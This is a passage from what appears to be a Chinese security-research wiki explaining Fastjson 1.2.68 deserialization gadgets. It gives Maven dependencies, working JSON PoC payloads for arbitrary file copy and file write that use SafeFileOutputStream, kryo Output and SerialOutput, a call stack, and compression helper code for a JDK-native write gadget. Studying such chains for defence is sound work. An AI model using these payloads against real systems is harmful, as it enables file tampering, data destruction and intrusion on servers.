   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.aspectj<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>aspectjtools<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.9.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>【<strong>PoC】</strong></p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;targetPath&quot;</span><span class="token operator">:</span> <span class="token string">&quot;D:/tmp/winini.txt&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;tempPath&quot;</span><span class="token operator">:</span> <span class="token string">&quot;C:/Windows/win.ini&quot;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240426094151-h7q2cpe.3dc1145e.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240430111850-lvmiqx3.aa485c98.png" alt="image" loading="lazy">​</p><p>​<code>org.eclipse.core.internal.localstore.SafeFileOutputStream#SafeFileOutputStream</code>​</p><p>因为 <code>SafeFileOutputStream</code>​ 的构造方法里，当 targetPath 不存在且 tempPath 存在时，便会进行文件复制。<strong><mark>漏了一个，还会清空源文件。。。</mark></strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token class-name">SafeFileOutputStream</span><span class="token punctuation">(</span><span class="token class-name">String</span> targetPath<span class="token punctuation">,</span> <span class="token class-name">String</span> tempPath<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>failed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>target <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>targetPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">createTempFile</span><span class="token punctuation">(</span>tempPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 如果目标文件 dst 不存在</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>temp<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
                <span class="token comment">// dst、src 都不存在时会往 dst 写数据</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token comment">// dst 不存在、src 存在时，先 &quot;mv src dst&quot;，再往 src 写数据</span>
            <span class="token comment">// 将临时文件内容复制到目标文件中</span>
            <span class="token comment">// 因为没有 return 会继续执行下面的语句，导致 src 清空</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>temp<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 如果 dst 文件存在，PoC 就会往 src 写数据</span>
        <span class="token comment">// 走到这里 src 会被改变这点要注意</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240430111517-4tvnps3.4edae8dc.png" alt="image" loading="lazy">​</p><h3 id="gadget-2-写文件" tabindex="-1"><a class="header-anchor" href="#gadget-2-写文件"><span>Gadget 2：写文件</span></a></h3><p><a href="https://b1ue.cn/archives/382.html" target="_blank" rel="noopener noreferrer">@ 浅蓝<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>在文章中分享了他挖掘写文件 gadget 的思路：</p><ul><li><p>需要一个通过 set 方法或构造方法<mark>指定文件路径的 OutputStream</mark></p></li><li><p>需要一个通过 set 方法或构造方法<mark>传入字节数据的 OutputStream，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream</mark></p></li><li><p>需要一个通过 set 方法或构造方法<strong>传入一个 OutputStream</strong>，并且可以通过调用 toString、hashCode、get、set、构造方法调用传入的 OutputStream 的 <code>flush</code>​ 方法</p><p><strong>【依赖】</strong></p></li></ul><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.aspectj<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>aspectjtools<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.9.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.esotericsoftware<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>kryo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.sleepycat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>je<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>18.3.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>【PoC】</strong></p><p><strong>注意此 poc 是不能创建目录的，只能创建文件。</strong></p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    &#39;stream&#39;<span class="token operator">:</span> <span class="token punctuation">{</span>
        &#39;@type&#39;<span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
        &#39;@type&#39;<span class="token operator">:</span> &#39;org.eclipse.core.internal.localstore.SafeFileOutputStream&#39;<span class="token punctuation">,</span>
        &#39;targetPath&#39;<span class="token operator">:</span> &#39;d<span class="token operator">:</span>/tmp/dst&#39;<span class="token punctuation">,</span>
        &#39;tempPath&#39;<span class="token operator">:</span> &#39;d<span class="token operator">:</span>/tmp/src&#39;
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    &#39;writer&#39;<span class="token operator">:</span> <span class="token punctuation">{</span>
        &#39;@type&#39;<span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
        &#39;@type&#39;<span class="token operator">:</span> &#39;com.esotericsoftware.kryo.io.Output&#39;<span class="token punctuation">,</span>
        &#39;buffer&#39;<span class="token operator">:</span> &#39;dGVzdCBieSBtb2Iu&#39;<span class="token punctuation">,</span>
        &#39;outputStream&#39;<span class="token operator">:</span> <span class="token punctuation">{</span>
            &#39;$ref&#39;<span class="token operator">:</span> &#39;$.stream&#39;
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        &#39;position&#39;<span class="token operator">:</span> <span class="token number">12</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    &#39;close&#39;<span class="token operator">:</span> <span class="token punctuation">{</span>
        &#39;@type&#39;<span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
        &#39;@type&#39;<span class="token operator">:</span> &#39;com.sleepycat.bind.serial.SerialOutput&#39;<span class="token punctuation">,</span>
        &#39;out&#39;<span class="token operator">:</span> <span class="token punctuation">{</span>
            &#39;$ref&#39;<span class="token operator">:</span> &#39;$.writer&#39;
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol><li>首先通过 <code>org.eclipse.core.internal.localstore.SafeFileOutputStream</code>​ 的构造方法**<mark>创建一个输出流对象</mark>**，并通过参数去指定目标路径 <code>/tmp/dst</code>​。和上一个复制文件使用的方法一样，不过指定的文件都不存在，所以创建输出流对象。</li></ol><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428110012-vuxnfzw.c015b523.png" alt="image" loading="lazy">​</p><p><strong>【<strong>​<strong><strong>​</strong></strong>​</strong>注</strong> <strong>】</strong> 这里第二次运行就会变成复制文件了。</p><ol start="2"><li>然后通过 <code>com.esotericsoftware.kryo.io.Output</code>​ 的**<mark>无参构造方法</mark>**（&quot;有无参构造函数就会调用无参构造函数&quot;[^1]）创建输出流对象，并通过 setter 方法将自身的输出流指向 <code>SafeFileOutputStream</code>​ 输出流对象，且通过 setter 方法往自身缓冲区填充要写入的数据。</li></ol><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428110946-ufojjrv.0313055b.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428112412-2jz5mxy.6766fcf4.png" alt="image" title="java.lang.reflect.Method#invoke" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428112509-vhqz53a.19d62b32.png" alt="image" title="/com/alibaba/fastjson/parser/deserializer/FieldDeserializer.java:110" loading="lazy">​</p><ol start="3"><li>最后，再通过 <code>com.sleepycat.bind.serial.SerialOutput</code>​ 的构造方法创建输出流对象，并通过参数将输出流指向 (2) 创建的 <code>Output</code>​ 对象；同时在 <code>com.sleepycat.bind.serial.SerialOutput</code>​ 构造方法调用的过程中，会调用 <code>com.esotericsoftware.kryo.io.Output#flush()</code>​ 方法，将 buffer 缓冲区。</li></ol><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428120025-f6ryxok.6dc964fa.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428120150-2ocw77t.5a15c39e.png" alt="image" title="com.sleepycat.bind.serial.SerialOutput#SerialOutput" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428120725-izc7tyr.bfcbb43b.png" alt="image" title="java.io.ObjectOutputStream#ObjectOutputStream(java.io.OutputStream)" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428120655-wgmlwwr.ee602e05.png" alt="image" title="  com.esotericsoftware.kryo.io.Output#flush" loading="lazy">​</p><p><strong>【部分调用栈如下】</strong></p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code>flush<span class="token operator">:</span><span class="token number">183</span><span class="token punctuation">,</span> Output (com.esotericsoftware.kryo.io)
require<span class="token operator">:</span><span class="token number">164</span><span class="token punctuation">,</span> Output (com.esotericsoftware.kryo.io)
writeBytes<span class="token operator">:</span><span class="token number">251</span><span class="token punctuation">,</span> Output (com.esotericsoftware.kryo.io)
write<span class="token operator">:</span><span class="token number">219</span><span class="token punctuation">,</span> Output (com.esotericsoftware.kryo.io)
drain<span class="token operator">:</span><span class="token number">1877</span><span class="token punctuation">,</span> ObjectOutputStream$BlockDataOutputStream (java.io)
setBlockDataMode<span class="token operator">:</span><span class="token number">1786</span><span class="token punctuation">,</span> ObjectOutputStream$BlockDataOutputStream (java.io)
&lt;init&gt;<span class="token operator">:</span><span class="token number">247</span><span class="token punctuation">,</span> ObjectOutputStream (java.io)
&lt;init&gt;<span class="token operator">:</span><span class="token number">81</span><span class="token punctuation">,</span> SerialOutput (com.sleepycat.bind.serial)
newInstance0<span class="token operator">:</span><span class="token number">-1</span><span class="token punctuation">,</span> NativeConstructorAccessorImpl (sun.reflect)
newInstance<span class="token operator">:</span><span class="token number">62</span><span class="token punctuation">,</span> NativeConstructorAccessorImpl (sun.reflect)
newInstance<span class="token operator">:</span><span class="token number">45</span><span class="token punctuation">,</span> DelegatingConstructorAccessorImpl (sun.reflect)
newInstance<span class="token operator">:</span><span class="token number">408</span><span class="token punctuation">,</span> Constructor (java.lang.reflect)
deserialze<span class="token operator">:</span><span class="token number">1012</span><span class="token punctuation">,</span> JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>【运行结果】</strong></p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428104258-l2uvkkx.7e67e9c0.png" alt="image" loading="lazy">​</p><h3 id="gadget-3-原生写文件-​openjdk-11​" tabindex="-1"><a class="header-anchor" href="#gadget-3-原生写文件-​openjdk-11​"><span>Gadget 3：原生写文件（​openjdk &gt;= 11​）</span></a></h3><p>这是 <a href="https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener noreferrer">@rmb122<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> 发现的一个仅依赖于 JDK 的写文件 gadget，尽管如此，前面也提到了，成功与否取决于目标程序的 JDK 是否带调试信息。</p><h4 id="制作压缩数据" tabindex="-1"><a class="header-anchor" href="#制作压缩数据"><span>制作压缩数据</span></a></h4><p><strong>【java.util.zip.InflaterOutputStream】</strong></p><p>​<code>java.util.zip.InflaterOutputStream</code>​ 是 Java 标准库中的类，它用于将数据从压缩格式解压缩为未压缩格式，并将结果写入输出流中。它的构造函数通常接受两个参数：一个是输出流，另一个是 <code>java.util.zip.Inflater</code>​ 对象，用于解压缩数据。</p><p>这个类的主要作用是从输入流中读取<strong>已压缩的数据</strong>，解压缩它，并将解压缩后的数据写入提供的输出流中。</p><p><strong>【制作压缩数据】</strong></p><p>由于 <code>java.utils.zip.Inflater</code>​ 处理的压缩数据是标准的 zip 格式，所以可通过命令行程序 gzip、openssl 或 python 脚本调用 zlib 库快速输出指定明文压缩后的数据。当然，也可以使用 Java 的 <code>Inflater/Deflater</code>​ 这两个类，JDK 文档里就有代码片段说明如何使用这两个类来实现压缩 / 解压缩，参考 <a href="http://scz.617.cn:8/web/202008111505.txt" target="_blank" rel="noopener noreferrer">202008111505 (617.cn)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>。</p><p><strong>【Python】</strong></p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> zlib
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> base64

data <span class="token operator">=</span> sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>
compressData <span class="token operator">=</span> zlib<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span>
b64Str <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>compressData<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;原数据： &quot;</span> <span class="token operator">+</span> data<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;压缩后的数据（base64 编码）： &quot;</span> <span class="token operator">+</span> b64Str<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;压缩后的字节数 = &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>compressData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

srcData <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>compressData<span class="token punctuation">)</span>
data1 <span class="token operator">=</span> srcData<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;解压后的数据： &quot;</span> <span class="token operator">+</span> data1<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428133528-aeft6ek.0a6b85a1.png" alt="image" loading="lazy">​</p><p><strong>【Java】</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">util</span><span class="token punctuation">;</span>

<span class="token comment">/*
 * javac -encoding GBK -g DeflateTest.java
 * java DeflateTest src dst 0
 * java DeflateTest dst src 1
 */</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>zip<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeflateTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">PrivateCopy</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span> is<span class="token punctuation">,</span> <span class="token class-name">OutputStream</span> os<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span> b<span class="token punctuation">;</span>

        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b <span class="token operator">=</span> is<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            os<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        is<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>  <span class="token comment">/* end of PrivateCopy */</span>

    <span class="token comment">// 压缩文件</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">DeflateFile</span><span class="token punctuation">(</span><span class="token class-name">String</span> src<span class="token punctuation">,</span> <span class="token class-name">String</span> dst<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>dst<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token doc-comment comment">/**
         * https://docs.oracle.com/javase/8/docs/api/java/util/zip/Deflater.html
         * https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/zip/Deflater.html
         *
         * https://docs.oracle.com/javase/8/docs/api/java/util/zip/DeflaterOutputStream.html
         */</span>
        <span class="token class-name">DeflaterOutputStream</span> dos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DeflaterOutputStream</span>
                <span class="token punctuation">(</span>
                        fos<span class="token punctuation">,</span>
                        <span class="token doc-comment comment">/**
                         * If the parameter nowrap is true then the ZLIB header and
                         * checksum fields will not be used.
                         * Params:
                         * level – the compression level (0-9)
                         * nowrap – if true then use GZIP compatible compression
                         */</span>
                        <span class="token keyword">new</span> <span class="token class-name">Deflater</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                        <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>
                <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">PrivateCopy</span><span class="token punctuation">(</span>fis<span class="token punctuation">,</span> dos<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>  <span class="token comment">/* end of DeflateFile */</span>

    <span class="token comment">// 解压文件</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">InflateFile</span><span class="token punctuation">(</span><span class="token class-name">String</span> src<span class="token punctuation">,</span> <span class="token class-name">String</span> dst<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token doc-comment comment">/**
         * https://docs.oracle.com/javase/8/docs/api/java/util/zip/Inflater.html
         * https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/zip/Inflater.html
         * https://docs.oracle.com/javase/8/docs/api/java/util/zip/InflaterInputStream.html
         */</span>
        <span class="token class-name">InflaterInputStream</span> iis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InflaterInputStream</span>
                <span class="token punctuation">(</span>
                        fis<span class="token punctuation">,</span>
                        <span class="token keyword">new</span> <span class="token class-name">Inflater</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                        <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>
                <span class="token punctuation">)</span><span class="token punctuation">;</span>
